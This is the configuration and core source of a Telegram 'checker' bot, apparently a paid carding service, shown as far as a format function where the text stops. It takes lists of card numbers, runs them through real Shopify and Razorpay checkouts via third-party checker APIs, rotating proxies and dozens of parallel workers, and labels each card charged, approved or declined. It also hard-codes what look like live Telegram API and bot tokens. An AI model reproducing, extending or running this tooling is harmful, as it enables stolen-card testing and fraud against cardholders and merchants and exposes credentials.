# ====================== CONFIGURATION ======================
API_ID = 30919664
API_HASH = "728958a80f9e4d36a499020e954adf15"
BOT_TOKEN = "8471637595:AAEcOZDEmCf8TRZSV9GbyY34OSHg3aFyWOs"

ADMIN_ID = [6778434153]
HIT_CHANNEL_ID = -1004294038729
JOIN_GROUP_ID = -1004294038729
JOIN_CHANNEL_ID = -1004294038729
JOIN_GROUP_LINK = "https://t.me/RavenCheckerV2"
JOIN_CHANNEL_LINK = "https://t.me/RavenCheckerV2"
FORCE_JOIN_IMAGES = []

# APIs
SHOPIFY_API_URL = "https://haters.cxchk.site/shopii"
RAZORPAY_API_URL = "https://razorpayapi-production.up.railway.app/razorpay"

# Worker limits
SP_PER_USER_WORKERS = 30
MSP_PER_USER_WORKERS = 70
RZ_PER_USER_WORKERS = 30
MRZ_PER_USER_WORKERS = 50
SITE_PER_USER_WORKERS = 30
PROXY_PER_USER_WORKERS = 50
BIN_WORKERS = 20

# Timeouts
API_TIMEOUT = 60
BIN_TIMEOUT = 60
PROXY_TIMEOUT = 12
RZ_TIMEOUT = 60

# General
BATCH_SIZE = 60
SITE_CHECK_BATCH = 40
HIT_DELAY = 1.5
PER_USER_LIMIT = 200
LOG_CHANNEL_ID = HIT_CHANNEL_ID
FREE_SP_DAILY_LIMIT = 15
FREE_SP_COOLDOWN = 10

# Plans
PLANS = {
    "plan1": {"name": "Core Access", "tier": "Core", "duration_days": 7, "emoji": "🛠️", "price": "$8.00"},
    "plan2": {"name": "Elite Access", "tier": "Elite", "duration_days": 15, "emoji": "👑", "price": "$14.00"},
    "plan3": {"name": "Root Access", "tier": "Root", "duration_days": 30, "emoji": "⭐", "price": "$25.00"},
    "plan4": {"name": "X-Access", "tier": "X", "duration_days": 90, "emoji": "💎", "price": "$60.00"},
}
PAID_TIERS = ["Core", "Elite", "Root", "X"]

# ====================== IMPORTS ======================
from telethon.errors import FloodWaitError
from telethon import TelegramClient, events, Button
from telethon.tl.types import MessageEntityCustomEmoji, ChannelParticipantBanned
from telethon.tl.functions.channels import GetParticipantRequest
from telethon.extensions import html as thtml
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
import string
import logging
import socket
import platform
from datetime import datetime, timedelta
from urllib.parse import urlparse, quote
from typing import Optional, List

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

# ====================== TELEGRAM CLIENT ======================
client = TelegramClient('razor_x_bot', API_ID, API_HASH)
client_instance = None

# ====================== DATABASE (SQLite) ======================
import sqlite3

DB_PATH = "razor_bot.db"

def get_db():
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

async def init_db():
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            plan TEXT DEFAULT 'Bronze',
            expiry TEXT,
            banned INTEGER DEFAULT 0,
            joined INTEGER DEFAULT 0
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS shopify_sites (
            user_id INTEGER,
            site TEXT,
            PRIMARY KEY (user_id, site)
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS razorpay_sites (
            user_id INTEGER,
            site TEXT,
            PRIMARY KEY (user_id, site)
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS proxies (
            user_id INTEGER,
            ip TEXT,
            port TEXT,
            username TEXT,
            password TEXT,
            proxy_url TEXT,
            type TEXT,
            PRIMARY KEY (user_id, proxy_url)
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS cards (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            card TEXT,
            status TEXT,
            response TEXT,
            gateway TEXT,
            price TEXT,
            date TEXT DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS global_sites (
            site TEXT PRIMARY KEY
        )
    ''')
    conn.commit()
    conn.close()

# ---- User helpers ----
async def ensure_user(user_id: int):
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("INSERT OR IGNORE INTO users (user_id, plan, expiry) VALUES (?, ?, ?)", (user_id, "Bronze", None))
    conn.commit()
    conn.close()

async def get_user_plan(user_id: int) -> str:
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT plan FROM users WHERE user_id = ?", (user_id,))
    row = cursor.fetchone()
    conn.close()
    return row["plan"] if row else "Bronze"

async def set_user_plan(user_id: int, plan: str, duration_days: int):
    expiry = (datetime.now() + timedelta(days=duration_days)).isoformat() if duration_days > 0 else None
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("UPDATE users SET plan = ?, expiry = ? WHERE user_id = ?", (plan, expiry, user_id))
    conn.commit()
    conn.close()

async def is_premium_user(user_id: int) -> bool:
    plan = await get_user_plan(user_id)
    return plan.lower() not in ("bronze", "free")

async def is_banned_user(user_id: int) -> bool:
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT banned FROM users WHERE user_id = ?", (user_id,))
    row = cursor.fetchone()
    conn.close()
    return bool(row and row["banned"])

async def mark_user_joined(user_id: int):
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("UPDATE users SET joined = 1 WHERE user_id = ?", (user_id,))
    conn.commit()
    conn.close()

async def is_user_marked_joined(user_id: int) -> bool:
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT joined FROM users WHERE user_id = ?", (user_id,))
    row = cursor.fetchone()
    conn.close()
    return bool(row and row["joined"])

async def remove_joined_mark(user_id: int):
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("UPDATE users SET joined = 0 WHERE user_id = ?", (user_id,))
    conn.commit()
    conn.close()

# ---- Shopify sites ----
async def add_shopify_site_db(user_id: int, site: str) -> bool:
    try:
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute("INSERT OR IGNORE INTO shopify_sites (user_id, site) VALUES (?, ?)", (user_id, site))
        conn.commit()
        inserted = cursor.rowcount > 0
        conn.close()
        return inserted
    except:
        return False

async def get_user_shopify_sites(user_id: int) -> List[str]:
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT site FROM shopify_sites WHERE user_id = ?", (user_id,))
    rows = cursor.fetchall()
    conn.close()
    return [row["site"] for row in rows]

async def remove_shopify_site_db(user_id: int, site: str) -> bool:
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM shopify_sites WHERE user_id = ? AND site = ?", (user_id, site))
    conn.commit()
    deleted = cursor.rowcount > 0
    conn.close()
    return deleted

async def clear_shopify_sites_db(user_id: int) -> int:
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM shopify_sites WHERE user_id = ?", (user_id,))
    deleted = cursor.rowcount
    conn.commit()
    conn.close()
    return deleted

async def get_total_shopify_sites_count() -> int:
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT COUNT(*) as cnt FROM shopify_sites")
    row = cursor.fetchone()
    conn.close()
    return row["cnt"] if row else 0

# ---- Razorpay sites ----
async def add_razorpay_site_db(user_id: int, site: str) -> bool:
    try:
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute("INSERT OR IGNORE INTO razorpay_sites (user_id, site) VALUES (?, ?)", (user_id, site))
        conn.commit()
        inserted = cursor.rowcount > 0
        conn.close()
        return inserted
    except:
        return False

async def get_user_razorpay_sites(user_id: int) -> List[str]:
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT site FROM razorpay_sites WHERE user_id = ?", (user_id,))
    rows = cursor.fetchall()
    conn.close()
    return [row["site"] for row in rows]

async def remove_razorpay_site_db(user_id: int, site: str) -> bool:
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM razorpay_sites WHERE user_id = ? AND site = ?", (user_id, site))
    conn.commit()
    deleted = cursor.rowcount > 0
    conn.close()
    return deleted

async def clear_razorpay_sites_db(user_id: int) -> int:
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM razorpay_sites WHERE user_id = ?", (user_id,))
    deleted = cursor.rowcount
    conn.commit()
    conn.close()
    return deleted

async def get_total_razorpay_sites_count() -> int:
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT COUNT(*) as cnt FROM razorpay_sites")
    row = cursor.fetchone()
    conn.close()
    return row["cnt"] if row else 0

# ---- Proxies ----
async def add_proxy_db(user_id: int, proxy_data: dict) -> bool:
    try:
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute('''
            INSERT OR IGNORE INTO proxies (user_id, ip, port, username, password, proxy_url, type)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        ''', (user_id, proxy_data['ip'], proxy_data['port'], proxy_data.get('username'), proxy_data.get('password'), proxy_data['proxy_url'], proxy_data.get('type', 'http')))
        conn.commit()
        conn.close()
        return True
    except:
        return False

async def get_all_user_proxies(user_id: int) -> List[dict]:
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT ip, port, username, password, proxy_url, type FROM proxies WHERE user_id = ?", (user_id,))
    rows = cursor.fetchall()
    conn.close()
    proxies = []
    for r in rows:
        proxies.append({
            'ip': r['ip'],
            'port': r['port'],
            'username': r['username'],
            'password': r['password'],
            'proxy_url': r['proxy_url'],
            'type': r['type']
        })
    return proxies

async def get_proxy_count(user_id: int) -> int:
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT COUNT(*) as cnt FROM proxies WHERE user_id = ?", (user_id,))
    row = cursor.fetchone()
    conn.close()
    return row["cnt"] if row else 0

async def remove_proxy_by_index(user_id: int, index: int) -> dict:
    proxies = await get_all_user_proxies(user_id)
    if 0 <= index < len(proxies):
        removed = proxies[index]
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute("DELETE FROM proxies WHERE user_id = ? AND proxy_url = ?", (user_id, removed['proxy_url']))
        conn.commit()
        conn.close()
        return removed
    return {}

async def remove_proxy_by_url(user_id: int, proxy_url: str) -> bool:
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM proxies WHERE user_id = ? AND proxy_url = ?", (user_id, proxy_url))
    conn.commit()
    deleted = cursor.rowcount > 0
    conn.close()
    return deleted

async def clear_all_proxies(user_id: int) -> int:
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM proxies WHERE user_id = ?", (user_id,))
    deleted = cursor.rowcount
    conn.commit()
    conn.close()
    return deleted

async def get_random_proxy(user_id: int) -> Optional[dict]:
    proxies = await get_all_user_proxies(user_id)
    if not proxies:
        return None
    return random.choice(proxies)

# ---- Card hits ----
async def save_card_to_db(card: str, status: str, response: str, gateway: str, price: str):
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO cards (card, status, response, gateway, price)
        VALUES (?, ?, ?, ?, ?)
    ''', (card, status, response, gateway, price))
    conn.commit()
    conn.close()

async def get_total_cards_count() -> int:
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT COUNT(*) as cnt FROM cards")
    row = cursor.fetchone()
    conn.close()
    return row["cnt"] if row else 0

async def get_charged_count() -> int:
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT COUNT(*) as cnt FROM cards WHERE status = 'CHARGED'")
    row = cursor.fetchone()
    conn.close()
    return row["cnt"] if row else 0

async def get_approved_count() -> int:
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT COUNT(*) as cnt FROM cards WHERE status = 'APPROVED'")
    row = cursor.fetchone()
    conn.close()
    return row["cnt"] if row else 0

# ---- Stats helpers ----
async def get_total_users() -> int:
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT COUNT(*) as cnt FROM users")
    row = cursor.fetchone()
    conn.close()
    return row["cnt"] if row else 0

async def get_premium_count() -> int:
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT COUNT(*) as cnt FROM users WHERE plan NOT IN ('Bronze', 'Free')")
    row = cursor.fetchone()
    conn.close()
    return row["cnt"] if row else 0

async def get_all_premium_users() -> List[int]:
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT user_id FROM users WHERE plan NOT IN ('Bronze', 'Free')")
    rows = cursor.fetchall()
    conn.close()
    return [row["user_id"] for row in rows]

async def get_global_sites() -> List[str]:
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT site FROM global_sites")
    rows = cursor.fetchall()
    conn.close()
    return [row["site"] for row in rows]

# ====================== LOGGING ======================
log = logging.getLogger("RazorX")
log.setLevel(logging.INFO)
_log_fmt = logging.Formatter('[%(asctime)s] [%(levelname)s] %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
_ch = logging.StreamHandler()
_ch.setLevel(logging.INFO)
_ch.setFormatter(_log_fmt)
log.addHandler(_ch)
try:
    _fh = logging.FileHandler('razor_x_bot.log', encoding='utf-8')
    _fh.setLevel(logging.INFO)
    _fh.setFormatter(_log_fmt)
    log.addHandler(_fh)
except:
    pass

def log_user(uid, action, msg, level="info"):
    getattr(log, level, log.info)(f"[USER:{uid}] [{action}] {msg}")

def log_system(action, msg, level="info"):
    getattr(log, level, log.info)(f"[SYSTEM] [{action}] {msg}")

# ====================== BOLD SANS CONVERTER ======================
_BOLD_SANS_MAP = {}
_normal_upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
_normal_lower = "abcdefghijklmnopqrstuvwxyz"
_normal_digits = "0123456789"
_bold_upper = "𝗔𝗕𝗖𝗗𝗘𝗙𝗚𝗛𝗜𝗝𝗞𝗟𝗠𝗡𝗢𝗣𝗤𝗥𝗦𝗧𝗨𝗩𝗪𝗫𝗬𝗭"
_bold_lower = "𝗮𝗯𝗰𝗱𝗲𝗳𝗴𝗵𝗶𝗷𝗸𝗹𝗺𝗻𝗼𝗽𝗾𝗿𝘀𝘁𝘂𝘃𝘄𝘅𝘆𝘇"
_bold_digits = "𝟬𝟭𝟮𝟯𝟰𝟱𝟲𝟳𝟴𝟵"

for _i, _c in enumerate(_normal_upper):
    _BOLD_SANS_MAP[_c] = _bold_upper[_i]
for _i, _c in enumerate(_normal_lower):
    _BOLD_SANS_MAP[_c] = _bold_lower[_i]
for _i, _c in enumerate(_normal_digits):
    _BOLD_SANS_MAP[_c] = _bold_digits[_i]

def bs(text):
    if not text:
        return text
    return "".join(_BOLD_SANS_MAP.get(c, c) for c in str(text))

# ====================== MESSAGE SYSTEM ======================
def build_entities(html_text, emoji_ids=None):
    text, entities = thtml.parse(html_text)
    if emoji_ids:
        idx, utf16_pos = 0, 0
        for ch in text:
            if ch == "⭐" and idx < len(emoji_ids):
                entities.append(MessageEntityCustomEmoji(offset=utf16_pos, length=1, document_id=emoji_ids[idx]))
                idx += 1
            utf16_pos += 2 if ord(ch) > 0xFFFF else 1
    return text, sorted(entities, key=lambda e: e.offset)

async def styled_reply(event, html_text, buttons=None, emoji_ids=None, file=None):
    try:
        text, entities = build_entities(html_text, emoji_ids)
        return await asyncio.wait_for(
            event.reply(text, formatting_entities=entities, buttons=buttons, file=file, link_preview=False),
            timeout=15
        )
    except asyncio.TimeoutError:
        return None
    except:
        try:
            return await asyncio.wait_for(
                event.reply(html_text[:4000], parse_mode='html', link_preview=False),
                timeout=10
            )
        except:
            return None

async def styled_send(chat_id, html_text, buttons=None, emoji_ids=None, file=None):
    try:
        text, entities = build_entities(html_text, emoji_ids)
        return await asyncio.wait_for(
            client.send_message(chat_id, text, formatting_entities=entities, buttons=buttons, file=file, link_preview=False),
            timeout=15
        )
    except:
        return None

async def styled_edit(msg, html_text, buttons=None, emoji_ids=None):
    try:
        text, entities = build_entities(html_text, emoji_ids)
        await asyncio.wait_for(
            msg.edit(text, formatting_entities=entities, buttons=buttons, link_preview=False),
            timeout=8
        )
    except:
        pass

def pbtn(text, data=None, url=None):
    if url:
        return Button.url(text, url)
    if data:
        return Button.inline(text, data.encode() if isinstance(data, str) else data)
    return Button.inline(text, b"none")

# ====================== CUSTOM EMOJI IDs ======================
CE = {
    "crown": 5039727497143387500, "bolt": 5042334757040423886,
    "brain": 5040030395416969985, "shield": 5042328396193864923,
    "star": 5042176294222037888, "gem": 5042050649248760772,
    "check": 5039793437776282663, "fire": 5039644681583985437,
    "party": 5039778134807806727, "search": 5039649904264217620,
    "chart": 5042290883949495533, "pin": 5039600026809009149,
    "joker": 5039998939076494446, "plus": 5039891861246838069,
    "cross": 5040042498634810056, "info": 5042306247047513767,
    "gift": 5041975203853239332, "eyes": 5039623284056917259,
    "trash": 5039614900280754969, "tick": 5039844895779455925,
    "stop": 5039671744172917707, "warn": 5039665997506675838,
    "link": 5042101437237036298, "globe": 5042186567783809934,
    "restart": 5413554170668032766, "online": 5413813953685923984,
    "declined": 4956612582816351459,
}
PE = "⭐"

# ====================== GLOBAL STATE ======================
ACTIVE_SESSIONS = {}
ACTIVE_MTXT_PROCESSES = {}
ACTIVE_MRZ_PROCESSES = {}
ACTIVE_ADD_PROCESSES = {}
PENDING_ADD_SITES = {}
PENDING_SITE_CHECK = {}
USER_APPROVED_PREF = {}
MAINTENANCE_FILE = "maintenance.json"
_MAINTENANCE_CACHE = {"enabled": None, "last_check": 0}
_JOIN_CACHE = {}
_FREE_SP_USAGE = {}
_FREE_SP_LAST_USE = {}
BOT_START_TIME = time.time()

HIT_BUTTON = [[Button.url(bs("dixit_nath"), "https://t.me/dixit_nath")]]

# ── PER-USER Semaphore Factory ──
_USER_SEMS = {}
_BIN_SEM = asyncio.Semaphore(BIN_WORKERS)

def get_user_sem(uid, sem_type="msp"):
    key = f"{uid}_{sem_type}"
    if key not in _USER_SEMS:
        limits = {
            "sp": SP_PER_USER_WORKERS,
            "msp": MSP_PER_USER_WORKERS,
            "rz": RZ_PER_USER_WORKERS,
            "mrz": MRZ_PER_USER_WORKERS,
            "site": SITE_PER_USER_WORKERS,
            "proxy": PROXY_PER_USER_WORKERS,
        }
        _USER_SEMS[key] = asyncio.Semaphore(limits.get(sem_type, 30))
    return _USER_SEMS[key]

def cleanup_user_sem(uid):
    keys_to_remove = [k for k in _USER_SEMS if k.startswith(f"{uid}_")]
    for k in keys_to_remove:
        del _USER_SEMS[k]

# ── HTTP Sessions ──
_USER_HTTP_SESSIONS = {}
_GLOBAL_BIN_SESSION = None
_GLOBAL_PROXY_SESSION = None

async def get_user_http_session(uid, purpose="general"):
    key = f"{uid}_{purpose}"
    session = _USER_HTTP_SESSIONS.get(key)
    if session is None or session.closed:
        timeout_val = RZ_TIMEOUT if purpose in ("rz", "mrz") else API_TIMEOUT
        connector = aiohttp.TCPConnector(
            limit=150,
            limit_per_host=50,
            ttl_dns_cache=300,
            use_dns_cache=True,
            keepalive_timeout=30,
            enable_cleanup_closed=True,
        )
        session = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=timeout_val, connect=10),
            connector=connector,
        )
        _USER_HTTP_SESSIONS[key] = session
    return session

async def cleanup_user_http_session(uid, purpose="general"):
    key = f"{uid}_{purpose}"
    session = _USER_HTTP_SESSIONS.pop(key, None)
    if session and not session.closed:
        try:
            await session.close()
        except:
            pass

async def get_bin_session():
    global _GLOBAL_BIN_SESSION
    if _GLOBAL_BIN_SESSION is None or _GLOBAL_BIN_SESSION.closed:
        _GLOBAL_BIN_SESSION = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=BIN_TIMEOUT, connect=5),
            connector=aiohttp.TCPConnector(limit=50, limit_per_host=20, ttl_dns_cache=300, use_dns_cache=True)
        )
    return _GLOBAL_BIN_SESSION

async def get_proxy_session():
    global _GLOBAL_PROXY_SESSION
    if _GLOBAL_PROXY_SESSION is None or _GLOBAL_PROXY_SESSION.closed:
        _GLOBAL_PROXY_SESSION = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=PROXY_TIMEOUT, connect=15),
            connector=aiohttp.TCPConnector(limit=30, limit_per_host=10, ttl_dns_cache=300, use_dns_cache=True)
        )
    return _GLOBAL_PROXY_SESSION

# ====================== FREE USER DAILY TRACKER ======================
def _get_today_key():
    return datetime.now().strftime("%Y-%m-%d")

def get_free_sp_usage(user_id):
    today = _get_today_key()
    entry = _FREE_SP_USAGE.get(user_id)
    if not entry or entry.get("date") != today:
        _FREE_SP_USAGE[user_id] = {"date": today, "count": 0}
        return 0
    return entry["count"]

def increment_free_sp_usage(user_id):
    today = _get_today_key()
    entry = _FREE_SP_USAGE.get(user_id)
    if not entry or entry.get("date") != today:
        _FREE_SP_USAGE[user_id] = {"date": today, "count": 1}
    else:
        _FREE_SP_USAGE[user_id]["count"] += 1

def get_free_sp_cooldown_remaining(user_id):
    last = _FREE_SP_LAST_USE.get(user_id, 0)
    elapsed = time.time() - last
    if elapsed >= FREE_SP_COOLDOWN:
        return 0
    return round(FREE_SP_COOLDOWN - elapsed, 1)

def set_free_sp_last_use(user_id):
    _FREE_SP_LAST_USE[user_id] = time.time()

# ====================== SMART ROTATION ENGINE ======================
class SmartRotator:
    def __init__(self):
        self._site_fails = {}
        self._proxy_fails = {}
        self._site_idx = 0
        self._proxy_idx = 0

    def pick_site(self, sites, exclude=None):
        if not sites:
            return None
        exclude = exclude or set()
        available = [s for s in sites if s not in exclude and self._site_fails.get(s, 0) < 5]
        if not available:
            available = [s for s in sites if s not in exclude]
        if not available:
            available = list(sites)
        self._site_idx = (self._site_idx + 1) % len(available)
        return available[self._site_idx]

    def pick_proxy(self, proxies, exclude=None):
        if not proxies:
            return None
        exclude = exclude or set()
        available = [p for p in proxies if p.get('proxy_url') not in exclude and self._proxy_fails.get(p.get('proxy_url'), 0) < 5]
        if not available:
            available = [p for p in proxies if p.get('proxy_url') not in exclude]
        if not available:
            available = list(proxies)
        self._proxy_idx = (self._proxy_idx + 1) % len(available)
        return available[self._proxy_idx]

    def report_site_ok(self, site):
        self._site_fails[site] = 0

    def report_site_fail(self, site):
        self._site_fails[site] = self._site_fails.get(site, 0) + 1

    def report_proxy_ok(self, proxy_url):
        if proxy_url:
            self._proxy_fails[proxy_url] = 0

    def report_proxy_fail(self, proxy_url):
        if proxy_url:
            self._proxy_fails[proxy_url] = self._proxy_fails.get(proxy_url, 0) + 1

    def get_site_fails(self, site):
        return self._site_fails.get(site, 0)

    def get_dead_sites(self, threshold=5):
        return {s for s, c in self._site_fails.items() if c >= threshold}

# ====================== ERROR DETECTION ======================
SITE_ERROR_KEYWORDS = [
    'r4 token empty', 'payment method is not shopify', 'r2 id empty', 'product id is empty',
    'py id empty', 'clinte token', 'receipt_empty', 'receipt id is empty', 'receipt empty',
    'site requires login', 'failed to get token', 'no valid products', 'not shopify',
    'failed to get checkout', 'failed to detect product', 'failed to create checkout',
    'failed to get proposal data', 'site not supported', 'site error! status: 429',
    'token not found', 'handle is empty', 'payment method identifier is empty',
    'failed to get session token', 'failed to tokenize card', 'no_session_token',
    'no session token', 'no checkout token found',
    'checkout token not found', 'no checkout token', 'checkout token is empty',
    'tokenize_fail', 'tokenize fail', 'tax ammount empty', 'tax amount empty',
    'tax amount is empty', 'del ammount empty', 'site not supported for now',
    'payment base card not supported', 'no product found', 'checkout is not available',
    'cart is empty', 'cart add failed after retries', 'checkout_expired',
    'checkout_not_found', 'no shipping methods available', 'site error', 'site dead',
    'site errors', 'server error', 'internal server error',
    'internal_server_error', 'application error', 'unexpected error',
    'something went wrong', 'error in 1st req', 'error in 1 req',
    'error processing card', 'we could not process', 'unable to process',
    'payment provider error', 'payment gateway error', 'session expired',
    'session invalid', 'failed after retries', 'max retries exceeded',
    'all sites dead', 'all sites unavailable', 'processinf error', 'handle error',
    'nonetype', "nonetype' object has no attribute 'get", 'unknown error',
    'unknown_error', 'unknown_result', 'utm_source', 'shop is unavailable',
    'store is unavailable', 'store not found', 'page not found',
    'this store is unavailable', 'this shop is currently unavailable',
    'password protected', 'enter store using password', 'storefront is password protected',
    'shop closed', 'store closed', 'delivery_delivery_line_detail_changed',
    'delivery_address2_required', 'delivery_line_detail_changed', 'delivery_line',
    'delivery_address', 'address_required', 'submit_rejected',
    'submit rejected:', 'change proxy or site', 'change site',
    'fake charge gate', 'fake gate',
    'hcaptcha detected', 'hcaptcha_detected', 'captcha at checkout',
    'captcha_required', 'captcha required', 'cloudflare',
    'access denied', 'permission denied',
    'connection error', 'connection failed', 'timed out', 'timeout',
    'could not resolve host', 'connect tunnel failed', 'unreachable',
    'network error', 'connection reset', 'empty reply from server',
    'tlsv1 alert', 'ssl routines', 'openssl ssl_connect', 'api_timeout',
    'http error', 'httperror504', '502', '503', '504',
    'bad gateway', 'service unavailable', 'gateway timeout',
    'site error! status: 404', 'site error! status: 401',
    'amount_too_small', 'amount too small', 'merchandise_not_enough_stock',
    'product out of stock', 'malformed input', 'url rejected',
    'invalid_response',
    'cart failed with status', 'invalid json response', 'invalid json',
    'inventoryreservationfailure', 'inventory_reservation_failure',
    'payments_positive_amount_expec', 'payments_payment_flexibility_t',
    'payments_credit_card_brand_not', 'buyer_identity_presentment_currency',
    "'products'", "error:", "error: '",
    'unable to get payment token',
    'empty submit response',
    'empty submit',
    'order_total_changed',
    'order total changed',
    'invalid_payment_method',
    'invalid payment method',
    'validation_custom',
    'validation custom',
    'ARTIFACT_DISSATISFACTION',
    'artifact_dissatisfaction',
    'TAX_NEW_TAX_MUST_BE_ACCEPTED',
    'tax_new_tax_must_be_accepted',
    'PROCESSING_ERROR',
    'processing_error',
    'DELIVERY_COMPANY_REQUIRED',
    'delivery_company_required',
    'DECISION_RULE_BLOCK',
    'decision_rule_block',
    'timeout'
]

PROXY_ERROR_KEYWORDS = [
    'proxy dead', 'proxy error', 'proxy timeout',
    'proxy connection failed', 'proxy refused',
]

RZ_RETRY_KEYWORDS = [
    'payment id not found', 'payment_id_not_found',
    'timeout', 'timed out', 'connection error',
    'connection failed', 'connection reset',
    'server error', 'internal server error',
    '502', '503', '504', 'bad gateway',
    'service unavailable', 'gateway timeout',
    'empty reply', 'invalid json',
    'could not resolve host', 'network error',
    'ssl routines', 'unreachable',
    'proxy dead', 'proxy error', 'proxy timeout',
    'DEAD | Payment ID not found', 'timeout',
]

def is_site_error(text):
    if not text:
        return True
    lower = text.lower().strip()
    if lower == 'na':
        return True
    return any(kw in lower for kw in SITE_ERROR_KEYWORDS)

def is_proxy_error(text):
    if not text:
        return False
    return any(kw in text.lower().strip() for kw in PROXY_ERROR_KEYWORDS)

def is_rz_retry_error(text):
    if not text:
        return True
    lower = text.lower().strip()
    return any(kw in lower for kw in RZ_RETRY_KEYWORDS)

def is_truly_alive(response, price):
    if not response:
        return False
    lower = response.lower().strip()
    pc = str(price).replace('$', '').strip() if price else '0'
    try:
        pv = float(pc)
    except:
        pv = 0.0
    bad = ['error:', 'error: ', "error: '", 'cart failed', 'invalid json',
           'inventoryreservationfailure', 'payments_positive_amount',
           'payments_payment_flexibility', 'payments_credit_card_brand']
    for b in bad:
        if b in lower:
            return False
    if pv == 0.0:
        normal = ['card_declined', 'card declined', 'generic_decline', 'generic decline',
                   'do_not_honor', 'do not honor', 'insufficient_funds', 'insufficient funds',
                   'stolen_card', 'lost_card', 'expired_card', 'expired card',
                   'otp_required', 'otp required', '3d', 'authentication',
                   'cvc', 'ccn', 'generic_error', 'generic error',
                   'restricted_card', 'fraudulent', 'not_permitted',
                   'transaction_not_allowed', 'card_not_supported']
        if not any(n in lower for n in normal):
            return False
    return True

# ====================== URL NORMALIZATION ======================
def normalize_site_url(url):
    """For Shopify: keep only domain (no path)."""
    url = url.strip().lower()
    url = re.sub(r'^https?://', '', url)
    url = url.rstrip('/')
    if url.startswith('www.'):
        url = url[4:]
    if '/' in url:
        url = url.split('/')[0]
    return url

# ====================== CARD FORMATTING ======================
def format_card_result(status, card, gateway, response, price="-", site="-", bin_info=None, elapsed=0.0):
    sm = {
        "Charged": (f"<b>{bs('CHARGED')}</b> {PE}", [CE["fire"]]),
        "Approved": (f"<b>{bs('APPROVED')}</b> {PE}", [CE["check"]]),
        "Declined": (f"<b>{bs('DECLINED')}</b> {PE}", [CE["declined"]]),
        "Error": (f"<b>{bs('ERROR')}</b> {PE}", [CE["cross"]])
    }
    h, he = sm.get(status, sm["Declined"])
    bi = bin_info or {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "flag": "🏳️"}
    ps = f"${str(price).replace('$', '')}" if price and price != "-" else "-"
    return f"""{h}
<b>━━━━━━━━━━━━━━━━━</b>
<a href='https://t.me/dixit_nath'>⊀</a> <b>{bs('Card')}</b>
⤷ <code>{card}</code>
<b>{bs('Gateway')}</b> ━ <code>{gateway}</code>
<b>{bs('Response')}</b> ━ <code>{response}</code>
<b>{bs('Price')}</b> ━ <code>{ps}</code>
<b>━━━━━━━━━━━━━━━━━</b>
<b>{bs('BIN')}:</b> <code>{bi.get('brand', '-')} | {bi.get('type', '-')} | {bi.get('level', '-')}</code>
<b>{bs('Bank')}:</b> <code>{bi.get('bank', '-')}</code>
<b>{bs('Country')}:</b> <code>{bi.get('country', '-')} {bi.get('flag', '🏳️')}</code>

<b>{bs('Took')}</b> ⏱ <code>{elapsed:.2f}{bs('s')}</code>""", he

def format_card_result_no_price(status, card, gateway, response, bin_info=None):
    sm = {
        "Charged": (f"<b>{bs('CHARGED')}</b> {PE}", [CE["fire"]]),
        "Approved": (f"<b>{bs('APPROVED')}</b> {PE}", [CE["check"]]),
        "Declined": (f"<b>{bs('DECLINED')}</b> {PE}", [CE["declined"]]),
        "Error": (f"<b>{bs('ERROR')}</b> {PE}", [CE["cross"]])
    }
    h, he = sm.get(status, sm["Declined"])
    bi = bin_info or {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "flag": "🏳️"}
    return f"""{h}
<b>━━━━━━━━━━━━━━━━━</b>
<a href='https://t.me/dixit_nath'>⊀</a> <b>{bs('Card')}</b>
